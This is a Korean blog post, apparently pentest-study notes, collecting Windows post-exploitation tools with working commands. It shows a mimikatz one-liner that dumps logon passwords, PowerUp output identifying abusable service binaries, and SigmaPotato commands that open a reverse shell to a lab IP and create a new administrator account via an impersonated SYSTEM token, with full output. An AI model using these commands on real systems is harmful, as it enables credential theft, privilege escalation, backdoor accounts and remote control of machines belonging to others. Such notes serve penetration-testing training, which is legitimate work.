---
layout: post
title: 유용한 윈도우 툴 모음집
subtitle: 많이 쓰는 윈도우 툴 모음집
category: knowledge
thumbnail-img: /assets/img/hazard.jpg
tags: [windows, tool]
author: Hong
---

이번에는 저번 포스팅에 이어서 윈도우 편.

# mimikatz

debug privilege가 있을 때 사용 할 수 있는 툴.

로컬 시스템의 유저 정보와 NTLM해쉬 등을 알 수 있다.

[mimikatz](https://github.com/ParrotSec/mimikatz/tree/master)

evil-winrm의 경우 mimikatz를 실행하면 버그가 걸리는데 이럴 때는 리버스쉘로 옮기거나 원라이너로 명령어를 넘겨주면 된다.

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "exit"
```

# Runas

GUI 환경에서 사용할 수 있는 툴.

다른 유저로서 조작하는게 가능하다.

래터럴 무브먼트에 사용하거나 관리자로 실행하는데 활용할 수 있다.

```
PS C:\Users\steve> runas /user:backupadmin cmd
Enter the password for backupadmin:
Attempting to start cmd as user "CLIENTWK220\backupadmin" ...

PS C:\Users\steve>
```

# winpeas

linpeas의 윈도우 버전.

[winpeas](https://www.kali.org/tools/peass-ng/)

# seatbelt.exe

winpeas같은 툴

# powerup.ps1

칼리에 기본적으로 깔려있다.

`cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .`

쓰기 권한을 가진 파일들을 조회하는게 가능하다.

```
PS C:\Users\dave> powershell -ep bypass
...
PS C:\Users\dave>  . .\PowerUp.ps1

PS C:\Users\dave> Get-ModifiableServiceFile

...

ServiceName                     : mysql
Path                            : C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
ModifiableFile                  : C:\xampp\mysql\bin\mysqld.exe
ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'mysql'
CanRestart                      : False
```

# powerview.ps1

이것도 칼리에 기본적으로 있는 툴.

도메인 정보를 파악할 때 유용하다.

사용하기 전에 모듈을 임포트해서 사용한다. `Import-Module`

# sigmapotato

SeImpersonatePrivilege Impersonate a client after authentication Enabled일 때 사용 할 수 있는 툴.

[sigmapotato](https://github.com/tylerdotrar/SigmaPotato/releases/tag/v1.2.6)

바로 리버스쉘로 연결하는 것도 가능하다.

`.\SigmaPotato.exe --revshell 192.168.45.181 9999`

그 밖에도 유저를 추가하거나 수정하는 것도 할 수 있다.

```
.\SigmaPotato "net user hong password /add"

PS C:\temp> .\SigmaPotato.exe "net user hong password /add"
[+] Starting Pipe Server...
[+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
[+] Pipe Connected!
[+] Impersonated Client: NT AUTHORITY\NETWORK SERVICE
[+] Searching for System Token...
[+] PID: 932 | Token: 0x660 | User: NT AUTHORITY\SYSTEM
[+] Found System Token: True
[+] Duplicating Token...
[+] New Token Handle: 1020
[+] Current Command Length: 27 characters
[+] Creating Process via 'CreateProcessAsUserW'
[+] Process Started with PID: 5532

[+] Process Output:
The command completed successfully.

.\SigmaPotato "net localgroup Administrators hong /add"

PS C:\temp> .\SigmaPotato.exe "net localgroup Administrators hong /add"
[+] Starting Pipe Server...
[+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
[+] Pipe Connected!
[+] Impersonated Client: NT AUTHORITY\NETWORK SERVICE
[+] Searching for System Token...
[+] PID: 932 | Token: 0x660 | User: NT AUTHORITY\SYSTEM
[+] Found System Token: True
[+] Duplicating Token...
[+] New Token Handle: 1016
[+] Current Command Length: 39 characters
[+] Creating Process via 'CreateProcessAsUserW'
[+] Process Started with PID: 6184

[+] Process Output:
The command completed successfully.
```

# winsimpleHTTP

감탄했던 툴 중에 하나.

파이썬이 설치되어 있지 않아도 간단하게 웹서버를 세울 수 있다. 파일을 옮기거나 할 때 편리하다.

[winsimplehttp](https://github.com/remisarrailh/WinSimpleHTTP)
